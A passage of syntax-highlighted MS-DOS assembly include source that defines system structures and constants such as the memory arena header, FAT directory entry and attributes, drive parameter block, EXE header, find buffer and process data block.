</span><span class="sc1">; arena item</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">arena</span><span class="sc0">   </span><span class="sc9">STRUC</span><span class="sc0">
</span><span class="sc5">arena_signature</span><span class="sc0">     </span><span class="sc9">DB</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">               </span><span class="sc1">; 4D for valid item, 5A for last item</span><span class="sc0">
</span><span class="sc5">arena_owner</span><span class="sc0">         </span><span class="sc9">DW</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">               </span><span class="sc1">; owner of arena item</span><span class="sc0">
</span><span class="sc5">arena_size</span><span class="sc0">          </span><span class="sc9">DW</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">               </span><span class="sc1">; size in paragraphs of item</span><span class="sc0">
</span><span class="sc5">arena</span><span class="sc0">   </span><span class="sc9">ENDS</span><span class="sc0">

</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; CAUTION: The routines in ALLOC.ASM rely on the fact that arena_signature</span><span class="sc0">
</span><span class="sc1">; and arena_owner_system are all equal to zero and are contained in DI.  Change</span><span class="sc0">
</span><span class="sc1">; them and change ALLOC.ASM.</span><span class="sc0">

</span><span class="sc5">arena_owner_system</span><span class="sc0">  </span><span class="sc9">EQU</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">               </span><span class="sc1">; free block indication</span><span class="sc0">

</span><span class="sc5">arena_signature_normal</span><span class="sc0">  </span><span class="sc9">EQU</span><span class="sc0"> </span><span class="sc2">4Dh</span><span class="sc0">         </span><span class="sc1">; valid signature, not end of arena</span><span class="sc0">
</span><span class="sc5">arena_signature_end</span><span class="sc0">     </span><span class="sc9">EQU</span><span class="sc0"> </span><span class="sc2">5Ah</span><span class="sc0">         </span><span class="sc1">; valid signature, last block in arena</span><span class="sc0">
</span><span class="sc1">;                                                                          ;</span><span class="sc0">
</span><span class="sc1">;            C  A  V  E  A  T     P  R  O  G  R  A  M  M  E  R             ;</span><span class="sc0">
</span><span class="sc1">;----+----+----+----+----+----+----+----+----+----+----+----+----+----+----;</span><span class="sc0">

</span><span class="sc1">;       SCCSID = @(#)dirent.asm 1.1 85/04/10</span><span class="sc0">
</span><span class="sc1">;       SCCSID = @(#)dirent.asm 1.1 85/04/10</span><span class="sc0">
</span><span class="sc1">;Break &lt;Directory entry&gt;</span><span class="sc0">

</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;       +---------------------------+</span><span class="sc0">
</span><span class="sc1">;       |  (12 BYTE) filename/ext   |       0       0</span><span class="sc0">
</span><span class="sc1">;       +---------------------------+</span><span class="sc0">
</span><span class="sc1">;       |     (BYTE) attributes     |       11      B</span><span class="sc0">
</span><span class="sc1">;       +---------------------------+</span><span class="sc0">
</span><span class="sc1">;       |    (10 BYTE) reserved     |       12      C</span><span class="sc0">
</span><span class="sc1">;       +---------------------------+</span><span class="sc0">
</span><span class="sc1">;       | (WORD) time of last write |       22      16</span><span class="sc0">
</span><span class="sc1">;       +---------------------------+</span><span class="sc0">
</span><span class="sc1">;       | (WORD) date of last write |       24      18</span><span class="sc0">
</span><span class="sc1">;       +---------------------------+</span><span class="sc0">
</span><span class="sc1">;       |   (WORD) First cluster    |       26      1A</span><span class="sc0">
</span><span class="sc1">;       +---------------------------+</span><span class="sc0">
</span><span class="sc1">;       |     (DWORD) file size     |       28      1C</span><span class="sc0">
</span><span class="sc1">;       +---------------------------+</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;   First byte of filename  = E5 -&gt; free directory entry</span><span class="sc0">
</span><span class="sc1">;                           = 00 -&gt; end of allocated directory</span><span class="sc0">
</span><span class="sc1">;   Time:   Bits 0-4=seconds/2, bits 5-10=minute, 11-15=hour</span><span class="sc0">
</span><span class="sc1">;   Date:   Bits 0-4=day, bits 5-8=month, bits 9-15=year-1980</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">

</span><span class="sc5">dir_entry</span><span class="sc0">   </span><span class="sc9">STRUC</span><span class="sc0">
</span><span class="sc5">dir_name</span><span class="sc0">    </span><span class="sc9">DB</span><span class="sc0">      </span><span class="sc2">11</span><span class="sc0"> </span><span class="sc9">DUP</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc10">?</span><span class="sc4">)</span><span class="sc0">          </span><span class="sc1">; file name</span><span class="sc0">
</span><span class="sc5">dir_attr</span><span class="sc0">    </span><span class="sc9">DB</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">                   </span><span class="sc1">; attribute bits</span><span class="sc0">
</span><span class="sc5">dir_pad</span><span class="sc0">     </span><span class="sc9">DB</span><span class="sc0">      </span><span class="sc2">10</span><span class="sc0"> </span><span class="sc9">DUP</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc10">?</span><span class="sc4">)</span><span class="sc0">          </span><span class="sc1">; reserved for expansion</span><span class="sc0">
</span><span class="sc5">dir_time</span><span class="sc0">    </span><span class="sc9">DW</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">                   </span><span class="sc1">; time of last write</span><span class="sc0">
</span><span class="sc5">dir_date</span><span class="sc0">    </span><span class="sc9">DW</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">                   </span><span class="sc1">; date of last write</span><span class="sc0">
</span><span class="sc5">dir_first</span><span class="sc0">   </span><span class="sc9">DW</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">                   </span><span class="sc1">; first allocation unit of file</span><span class="sc0">
</span><span class="sc5">dir_size_l</span><span class="sc0">  </span><span class="sc9">DW</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">                   </span><span class="sc1">; low 16 bits of file size</span><span class="sc0">
</span><span class="sc5">dir_size_h</span><span class="sc0">  </span><span class="sc9">DW</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">                   </span><span class="sc1">; high 16 bits of file size</span><span class="sc0">
</span><span class="sc5">dir_entry</span><span class="sc0">   </span><span class="sc9">ENDS</span><span class="sc0">

</span><span class="sc5">attr_read_only</span><span class="sc0">      </span><span class="sc9">EQU</span><span class="sc0">      </span><span class="sc2">1h</span><span class="sc0">
</span><span class="sc5">attr_hidden</span><span class="sc0">         </span><span class="sc9">EQU</span><span class="sc0">      </span><span class="sc2">2h</span><span class="sc0">
</span><span class="sc5">attr_system</span><span class="sc0">         </span><span class="sc9">EQU</span><span class="sc0">      </span><span class="sc2">4h</span><span class="sc0">
</span><span class="sc5">attr_volume_id</span><span class="sc0">      </span><span class="sc9">EQU</span><span class="sc0">      </span><span class="sc2">8h</span><span class="sc0">
</span><span class="sc5">attr_directory</span><span class="sc0">      </span><span class="sc9">EQU</span><span class="sc0">     </span><span class="sc2">10h</span><span class="sc0">
</span><span class="sc5">attr_archive</span><span class="sc0">        </span><span class="sc9">EQU</span><span class="sc0">     </span><span class="sc2">20h</span><span class="sc0">
</span><span class="sc5">attr_device</span><span class="sc0">         </span><span class="sc9">EQU</span><span class="sc0">     </span><span class="sc2">40h</span><span class="sc0">        </span><span class="sc1">; This is a VERY special bit.</span><span class="sc0">
                                       </span><span class="sc1">;   NO directory entry on a disk EVER</span><span class="sc0">
                                       </span><span class="sc1">;   has this bit set. It is set non-zero</span><span class="sc0">
                                       </span><span class="sc1">;   when a device is found by GETPATH</span><span class="sc0">

</span><span class="sc5">attr_all</span><span class="sc0">            </span><span class="sc9">EQU</span><span class="sc0">     </span><span class="sc5">attr_hidden</span><span class="sc4">+</span><span class="sc5">attr_system</span><span class="sc4">+</span><span class="sc5">attr_directory</span><span class="sc0">
                                        </span><span class="sc1">; OR of hard attributes for FINDENTRY</span><span class="sc0">

</span><span class="sc5">attr_ignore</span><span class="sc0">         </span><span class="sc9">EQU</span><span class="sc0">     </span><span class="sc5">attr_read_only</span><span class="sc4">+</span><span class="sc5">attr_archive</span><span class="sc4">+</span><span class="sc5">attr_device</span><span class="sc0">
                                        </span><span class="sc1">; ignore this(ese) attribute(s) during</span><span class="sc0">
                                        </span><span class="sc1">; search first/next</span><span class="sc0">

</span><span class="sc5">attr_changeable</span><span class="sc0">     </span><span class="sc9">EQU</span><span class="sc0">     </span><span class="sc5">attr_read_only</span><span class="sc4">+</span><span class="sc5">attr_hidden</span><span class="sc4">+</span><span class="sc5">attr_system</span><span class="sc4">+</span><span class="sc5">attr_archive</span><span class="sc0">
                                        </span><span class="sc1">; changeable via CHMOD</span><span class="sc0">

</span><span class="sc1">;       SCCSID = @(#)dpb.asm    1.1 85/04/10</span><span class="sc0">
</span><span class="sc1">;       SCCSID = @(#)dpb.asm    1.1 85/04/10</span><span class="sc0">
</span><span class="sc1">;BREAK &lt;DPB structure&gt;</span><span class="sc0">
</span><span class="sc1">;----+----+----+----+----+----+----+----+----+----+----+----+----+----+----;</span><span class="sc0">
</span><span class="sc1">;            C  A  V  E  A  T     P  R  O  G  R  A  M  M  E  R             ;</span><span class="sc0">
</span><span class="sc1">;                                                                          ;</span><span class="sc0">
</span><span class="sc5">dpb</span><span class="sc0">     </span><span class="sc9">STRUC</span><span class="sc0">
</span><span class="sc5">dpb_drive</span><span class="sc0">           </span><span class="sc9">DB</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">           </span><span class="sc1">; Logical drive # assoc with DPB</span><span class="sc0">
</span><span class="sc5">dpb_UNIT</span><span class="sc0">            </span><span class="sc9">DB</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">           </span><span class="sc1">; Driver unit number of DPB</span><span class="sc0">
</span><span class="sc5">dpb_sector_size</span><span class="sc0">     </span><span class="sc9">DW</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">           </span><span class="sc1">; Size of physical sector in bytes</span><span class="sc0">
</span><span class="sc5">dpb_cluster_mask</span><span class="sc0">    </span><span class="sc9">DB</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">           </span><span class="sc1">; Sectors/cluster - 1</span><span class="sc0">
</span><span class="sc5">dpb_cluster_shift</span><span class="sc0">   </span><span class="sc9">DB</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">           </span><span class="sc1">; Log2 of sectors/cluster</span><span class="sc0">
</span><span class="sc5">dpb_first_FAT</span><span class="sc0">       </span><span class="sc9">DW</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">           </span><span class="sc1">; Starting record of FATs</span><span class="sc0">
</span><span class="sc5">dpb_FAT_count</span><span class="sc0">       </span><span class="sc9">DB</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">           </span><span class="sc1">; Number of FATs for this drive</span><span class="sc0">
</span><span class="sc5">dpb_root_entries</span><span class="sc0">    </span><span class="sc9">DW</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">           </span><span class="sc1">; Number of directory entries</span><span class="sc0">
</span><span class="sc5">dpb_first_sector</span><span class="sc0">    </span><span class="sc9">DW</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">           </span><span class="sc1">; First sector of first cluster</span><span class="sc0">
</span><span class="sc5">dpb_max_cluster</span><span class="sc0">     </span><span class="sc9">DW</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">           </span><span class="sc1">; Number of clusters on drive + 1</span><span class="sc0">
</span><span class="sc5">dpb_FAT_size</span><span class="sc0">        </span><span class="sc9">DB</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">           </span><span class="sc1">; Number of records occupied by FAT</span><span class="sc0">
</span><span class="sc5">dpb_dir_sector</span><span class="sc0">      </span><span class="sc9">DW</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">           </span><span class="sc1">; Starting record of directory</span><span class="sc0">
</span><span class="sc5">dpb_driver_addr</span><span class="sc0">     </span><span class="sc9">DD</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">           </span><span class="sc1">; Pointer to driver</span><span class="sc0">
</span><span class="sc5">dpb_media</span><span class="sc0">           </span><span class="sc9">DB</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">           </span><span class="sc1">; Media byte</span><span class="sc0">
</span><span class="sc5">dpb_first_access</span><span class="sc0">    </span><span class="sc9">DB</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">           </span><span class="sc1">; This is init. to -1 to force a media</span><span class="sc0">
                                        </span><span class="sc1">; check the first time this DPB is used</span><span class="sc0">
</span><span class="sc5">dpb_next_dpb</span><span class="sc0">        </span><span class="sc9">DD</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">           </span><span class="sc1">; Pointer to next Drive parameter block</span><span class="sc0">
</span><span class="sc5">dpb_next_free</span><span class="sc0">       </span><span class="sc9">DW</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">           </span><span class="sc1">; Cluster # of last allocated cluster</span><span class="sc0">
</span><span class="sc5">dpb_free_cnt</span><span class="sc0">        </span><span class="sc9">DW</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">           </span><span class="sc1">; Count of free clusters, -1 if unknown</span><span class="sc0">
</span><span class="sc5">dpb</span><span class="sc0">     </span><span class="sc9">ENDS</span><span class="sc0">

</span><span class="sc5">DPBSIZ</span><span class="sc0">  </span><span class="sc9">EQU</span><span class="sc0">     </span><span class="sc9">SIZE</span><span class="sc0"> </span><span class="sc5">dpb</span><span class="sc0">                </span><span class="sc1">; Size of the structure in bytes</span><span class="sc0">

</span><span class="sc5">DSKSIZ</span><span class="sc0">  </span><span class="sc4">=</span><span class="sc0">       </span><span class="sc5">dpb_max_cluster</span><span class="sc0">         </span><span class="sc1">; Disk size (used during init only)</span><span class="sc0">
</span><span class="sc1">;                                                                          ;</span><span class="sc0">
</span><span class="sc1">;            C  A  V  E  A  T     P  R  O  G  R  A  M  M  E  R             ;</span><span class="sc0">
</span><span class="sc1">;----+----+----+----+----+----+----+----+----+----+----+----+----+----+----;</span><span class="sc0">

</span><span class="sc1">;       SCCSID = @(#)exe.asm    1.1 85/04/10</span><span class="sc0">
</span><span class="sc1">;       SCCSID = @(#)exe.asm    1.1 85/04/10</span><span class="sc0">
</span><span class="sc1">;BREAK &lt;EXEC and EXE file structures&gt;</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; EXEC arg block - load/go program</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">

</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; The following get used as arguments to the EXEC system call.  They indicate</span><span class="sc0">
</span><span class="sc1">; whether or not the program is executed or whether or not a program header</span><span class="sc0">
</span><span class="sc1">; gets created.</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">exec_func_no_execute</span><span class="sc0">    </span><span class="sc9">EQU</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">           </span><span class="sc1">; no execute bit</span><span class="sc0">
</span><span class="sc5">exec_func_overlay</span><span class="sc0">       </span><span class="sc9">EQU</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc0">           </span><span class="sc1">; overlay bit</span><span class="sc0">

</span><span class="sc5">Exec0</span><span class="sc0">           </span><span class="sc9">STRUC</span><span class="sc0">
</span><span class="sc5">Exec0_environ</span><span class="sc0">   </span><span class="sc9">DW</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">               </span><span class="sc1">; seg addr of environment</span><span class="sc0">
</span><span class="sc5">Exec0_com_line</span><span class="sc0">  </span><span class="sc9">DD</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">               </span><span class="sc1">; pointer to asciz command line</span><span class="sc0">
</span><span class="sc5">Exec0_5C_FCB</span><span class="sc0">    </span><span class="sc9">DD</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">               </span><span class="sc1">; default fcb at 5C</span><span class="sc0">
</span><span class="sc5">Exec0_6C_FCB</span><span class="sc0">    </span><span class="sc9">DD</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">               </span><span class="sc1">; default fcb at 6C</span><span class="sc0">
</span><span class="sc5">Exec0</span><span class="sc0">           </span><span class="sc9">ENDS</span><span class="sc0">

</span><span class="sc5">Exec1</span><span class="sc0">           </span><span class="sc9">STRUC</span><span class="sc0">
</span><span class="sc5">Exec1_environ</span><span class="sc0">   </span><span class="sc9">DW</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">               </span><span class="sc1">; seg addr of environment</span><span class="sc0">
</span><span class="sc5">Exec1_com_line</span><span class="sc0">  </span><span class="sc9">DD</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">               </span><span class="sc1">; pointer to asciz command line</span><span class="sc0">
</span><span class="sc5">Exec1_5C_FCB</span><span class="sc0">    </span><span class="sc9">DD</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">               </span><span class="sc1">; default fcb at 5C</span><span class="sc0">
</span><span class="sc5">Exec1_6C_FCB</span><span class="sc0">    </span><span class="sc9">DD</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">               </span><span class="sc1">; default fcb at 6C</span><span class="sc0">
</span><span class="sc5">Exec1_SP</span><span class="sc0">        </span><span class="sc9">DW</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">               </span><span class="sc1">; stack pointer of program</span><span class="sc0">
</span><span class="sc5">Exec1_SS</span><span class="sc0">        </span><span class="sc9">DW</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">               </span><span class="sc1">; stack seg register of program</span><span class="sc0">
</span><span class="sc5">Exec1_IP</span><span class="sc0">        </span><span class="sc9">DW</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">               </span><span class="sc1">; entry point IP</span><span class="sc0">
</span><span class="sc5">Exec1_CS</span><span class="sc0">        </span><span class="sc9">DW</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">               </span><span class="sc1">; entry point CS</span><span class="sc0">
</span><span class="sc5">Exec1</span><span class="sc0">           </span><span class="sc9">ENDS</span><span class="sc0">

</span><span class="sc5">Exec3</span><span class="sc0">           </span><span class="sc9">STRUC</span><span class="sc0">
</span><span class="sc5">Exec3_load_addr</span><span class="sc0"> </span><span class="sc9">DW</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">               </span><span class="sc1">; seg address of load point</span><span class="sc0">
</span><span class="sc5">Exec3_reloc_fac</span><span class="sc0"> </span><span class="sc9">DW</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">               </span><span class="sc1">; relocation factor</span><span class="sc0">
</span><span class="sc5">Exec3</span><span class="sc0">           </span><span class="sc9">ENDS</span><span class="sc0">

</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; Exit codes in upper byte</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">Exit_terminate</span><span class="sc0">      </span><span class="sc9">EQU</span><span class="sc0">     </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">Exit_abort</span><span class="sc0">          </span><span class="sc9">EQU</span><span class="sc0">     </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">Exit_Ctrl_C</span><span class="sc0">         </span><span class="sc9">EQU</span><span class="sc0">     </span><span class="sc2">1</span><span class="sc0">
</span><span class="sc5">Exit_Hard_Error</span><span class="sc0">     </span><span class="sc9">EQU</span><span class="sc0">     </span><span class="sc2">2</span><span class="sc0">
</span><span class="sc5">Exit_Keep_process</span><span class="sc0">   </span><span class="sc9">EQU</span><span class="sc0">     </span><span class="sc2">3</span><span class="sc0">

</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; EXE file header</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">

</span><span class="sc5">EXE_file</span><span class="sc0">    </span><span class="sc9">STRUC</span><span class="sc0">
</span><span class="sc5">exe_signature</span><span class="sc0">   </span><span class="sc9">DW</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">                   </span><span class="sc1">; must contain 4D5A  (yay zibo!)</span><span class="sc0">
</span><span class="sc5">exe_len_mod_512</span><span class="sc0"> </span><span class="sc9">DW</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">                   </span><span class="sc1">; low 9 bits of length</span><span class="sc0">
</span><span class="sc5">exe_pages</span><span class="sc0">       </span><span class="sc9">DW</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">                   </span><span class="sc1">; number of 512b pages in file</span><span class="sc0">
</span><span class="sc5">exe_rle_count</span><span class="sc0">   </span><span class="sc9">DW</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">                   </span><span class="sc1">; count of reloc entries</span><span class="sc0">
</span><span class="sc5">exe_par_dir</span><span class="sc0">     </span><span class="sc9">DW</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">                   </span><span class="sc1">; number of paragraphs before image</span><span class="sc0">
</span><span class="sc5">exe_min_BSS</span><span class="sc0">     </span><span class="sc9">DW</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">                   </span><span class="sc1">; minimum number of para of BSS</span><span class="sc0">
</span><span class="sc5">exe_max_BSS</span><span class="sc0">     </span><span class="sc9">DW</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">                   </span><span class="sc1">; max number of para of BSS</span><span class="sc0">
</span><span class="sc5">exe_SS</span><span class="sc0">          </span><span class="sc9">DW</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">                   </span><span class="sc1">; stack of image</span><span class="sc0">
</span><span class="sc5">exe_SP</span><span class="sc0">          </span><span class="sc9">DW</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">                   </span><span class="sc1">; SP of image</span><span class="sc0">
</span><span class="sc5">exe_chksum</span><span class="sc0">      </span><span class="sc9">DW</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">                   </span><span class="sc1">; checksum  of file (ignored)</span><span class="sc0">
</span><span class="sc5">exe_IP</span><span class="sc0">          </span><span class="sc9">DW</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">                   </span><span class="sc1">; IP of entry</span><span class="sc0">
</span><span class="sc5">exe_CS</span><span class="sc0">          </span><span class="sc9">DW</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">                   </span><span class="sc1">; CS of entry</span><span class="sc0">
</span><span class="sc5">exe_rle_table</span><span class="sc0">   </span><span class="sc9">DW</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">                   </span><span class="sc1">; byte offset of reloc table</span><span class="sc0">
</span><span class="sc5">exe_iov</span><span class="sc0">         </span><span class="sc9">DW</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">                   </span><span class="sc1">; overlay number (0 for root)</span><span class="sc0">
</span><span class="sc5">exe_sym_tab</span><span class="sc0">     </span><span class="sc9">DD</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">                   </span><span class="sc1">; offset of symbol table in file</span><span class="sc0">
</span><span class="sc5">EXE_file</span><span class="sc0">    </span><span class="sc9">ENDS</span><span class="sc0">

</span><span class="sc5">exe_valid_signature</span><span class="sc0">     </span><span class="sc9">EQU</span><span class="sc0"> </span><span class="sc2">5A4Dh</span><span class="sc0">
</span><span class="sc5">exe_valid_old_signature</span><span class="sc0"> </span><span class="sc9">EQU</span><span class="sc0"> </span><span class="sc2">4D5Ah</span><span class="sc0">

</span><span class="sc5">symbol_entry</span><span class="sc0">    </span><span class="sc9">STRUC</span><span class="sc0">
</span><span class="sc5">sym_value</span><span class="sc0">       </span><span class="sc9">DD</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">sym_type</span><span class="sc0">        </span><span class="sc9">DW</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">sym_len</span><span class="sc0">         </span><span class="sc9">DB</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">sym_name</span><span class="sc0">        </span><span class="sc9">DB</span><span class="sc0">  </span><span class="sc2">255</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc10">?</span><span class="sc4">)</span><span class="sc0">
</span><span class="sc5">symbol_entry</span><span class="sc0">    </span><span class="sc9">ENDS</span><span class="sc0">

</span><span class="sc1">;       SCCSID = @(#)find.asm   1.1 85/04/10</span><span class="sc0">
</span><span class="sc1">;       SCCSID = @(#)find.asm   1.1 85/04/10</span><span class="sc0">
</span><span class="sc1">;Break   &lt;find first/next buffer&gt;</span><span class="sc0">

</span><span class="sc5">find_buf</span><span class="sc0">    </span><span class="sc9">STRUC</span><span class="sc0">
</span><span class="sc1">;----+----+----+----+----+----+----+----+----+----+----+----+----+----+----;</span><span class="sc0">
</span><span class="sc1">;            C  A  V  E  A  T     P  R  O  G  R  A  M  M  E  R             ;</span><span class="sc0">
</span><span class="sc1">;                                                                          ;</span><span class="sc0">
</span><span class="sc5">find_buf_drive</span><span class="sc0">      </span><span class="sc9">DB</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">               </span><span class="sc1">; drive of search</span><span class="sc0">
</span><span class="sc5">find_buf_name</span><span class="sc0">       </span><span class="sc9">DB</span><span class="sc0">  </span><span class="sc2">11</span><span class="sc0"> </span><span class="sc9">DUP</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc10">?</span><span class="sc4">)</span><span class="sc0">      </span><span class="sc1">; formatted name</span><span class="sc0">
</span><span class="sc5">find_buf_sattr</span><span class="sc0">      </span><span class="sc9">DB</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">               </span><span class="sc1">; attribute of search</span><span class="sc0">
</span><span class="sc5">find_buf_LastEnt</span><span class="sc0">    </span><span class="sc9">DW</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">               </span><span class="sc1">; LastEnt</span><span class="sc0">
</span><span class="sc5">find_buf_DirStart</span><span class="sc0">   </span><span class="sc9">DW</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">               </span><span class="sc1">; DirStart</span><span class="sc0">
</span><span class="sc5">find_buf_NetID</span><span class="sc0">      </span><span class="sc9">DB</span><span class="sc0">  </span><span class="sc2">4</span><span class="sc0"> </span><span class="sc9">DUP</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc10">?</span><span class="sc4">)</span><span class="sc0">       </span><span class="sc1">; Reserved for NET</span><span class="sc0">
</span><span class="sc1">;                                                                          ;</span><span class="sc0">
</span><span class="sc1">;            C  A  V  E  A  T     P  R  O  G  R  A  M  M  E  R             ;</span><span class="sc0">
</span><span class="sc1">;----+----+----+----+----+----+----+----+----+----+----+----+----+----+----;</span><span class="sc0">

</span><span class="sc5">find_buf_attr</span><span class="sc0">       </span><span class="sc9">DB</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">               </span><span class="sc1">; attribute found</span><span class="sc0">
</span><span class="sc5">find_buf_time</span><span class="sc0">       </span><span class="sc9">DW</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">               </span><span class="sc1">; time</span><span class="sc0">
</span><span class="sc5">find_buf_date</span><span class="sc0">       </span><span class="sc9">DW</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">               </span><span class="sc1">; date</span><span class="sc0">
</span><span class="sc5">find_buf_size_l</span><span class="sc0">     </span><span class="sc9">DW</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">               </span><span class="sc1">; low(size)</span><span class="sc0">
</span><span class="sc5">find_buf_size_h</span><span class="sc0">     </span><span class="sc9">DW</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">               </span><span class="sc1">; high(size)</span><span class="sc0">
</span><span class="sc5">find_buf_pname</span><span class="sc0">      </span><span class="sc9">DB</span><span class="sc0">  </span><span class="sc2">13</span><span class="sc0"> </span><span class="sc9">DUP</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc10">?</span><span class="sc4">)</span><span class="sc0">      </span><span class="sc1">; packed name</span><span class="sc0">
</span><span class="sc5">find_buf</span><span class="sc0">    </span><span class="sc9">ENDS</span><span class="sc0">

</span><span class="sc1">;       SCCSID = @(#)pdb.asm    1.1 85/04/10</span><span class="sc0">
</span><span class="sc1">;BREAK &lt;Process data block&gt;</span><span class="sc0">

</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; Process data block (otherwise known as program header)</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">

</span><span class="sc5">FilPerProc</span><span class="sc0">          </span><span class="sc9">EQU</span><span class="sc0">     </span><span class="sc2">20</span><span class="sc0">

</span><span class="sc5">Process_data_block</span><span class="sc0">  </span><span class="sc9">STRUC</span><span class="sc0">
</span><span class="sc5">PDB_Exit_Call</span><span class="sc0">       </span><span class="sc9">DW</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">           </span><span class="sc1">; INT int_abort system terminate</span><span class="sc0">
</span><span class="sc5">PDB_block_len</span><span class="sc0">       </span><span class="sc9">DW</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">           </span><span class="sc1">; size of execution block</span><span class="sc0">
                    </span><span class="sc9">DB</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">PDB_CPM_Call</span><span class="sc0">        </span><span class="sc9">DB</span><span class="sc0">  </span><span class="sc2">5</span><span class="sc0"> </span><span class="sc9">DUP</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc10">?</span><span class="sc4">)</span><span class="sc0">       </span><span class="sc1">; ancient call to system</span><span class="sc0">
</span><span class="sc5">PDB_Exit</span><span class="sc0">            </span><span class="sc9">DD</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">           </span><span class="sc1">; pointer to exit routine</span><span class="sc0">
</span><span class="sc5">PDB_Ctrl_C</span><span class="sc0">          </span><span class="sc9">DD</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">           </span><span class="sc1">; pointer to ^C routine</span><span class="sc0">
